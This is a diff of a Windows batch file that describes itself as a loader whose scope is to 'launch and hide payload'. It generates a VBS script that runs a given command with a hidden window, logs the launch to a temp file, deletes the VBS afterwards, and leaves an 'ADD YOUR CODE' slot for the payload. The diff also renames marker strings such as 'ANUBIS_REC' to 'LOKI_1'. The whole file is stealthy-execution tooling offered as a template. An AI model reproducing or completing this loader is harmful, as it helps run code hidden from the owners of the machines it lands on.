@@ -1,5 +1,7 @@
-REM VBS LOADER
-REM ADRENALINE RT
+REM Author: Roberto Mazzoni
+REM Scope: launch and hide payload
+REM VBS LOADER and LAUNCHER
+REM functions:
 REM ########################################
 REM ## -1 Auto_generate vbs code          ##
 REM ## -2 Launch wshell.vbs thisfile.cmd  ##
@@ -16,14 +18,16 @@ echo     Set WshShell = CreateObject^("WScript.Shell"^) >> %vbsname%
 echo     cmds=WshShell.RUN^(strArg, 0, False^) >> %vbsname%
 echo     Set WshShell = Nothing >> %vbsname%
 echo Next >> %vbsname%
-echo ANUBIS_REC %datanows% HIDE SERVICE WITH VBS>>%TMP%\hideMS.log
+REM WRITE LOG
+echo PROGRAM TEST LOKI_1 START AT: %datanows%>>%TMP%\hideMS.log
+REM FINALLY::
 start %vbsname% %TMP%\%scriptName%
 exit
 )
-
+REM IF EXIST::
 del %vbsname%
-REM ######################################################################
 
+REM ADD YOUR CODE:
 REM Start Payload
 REM ...
 REM ...
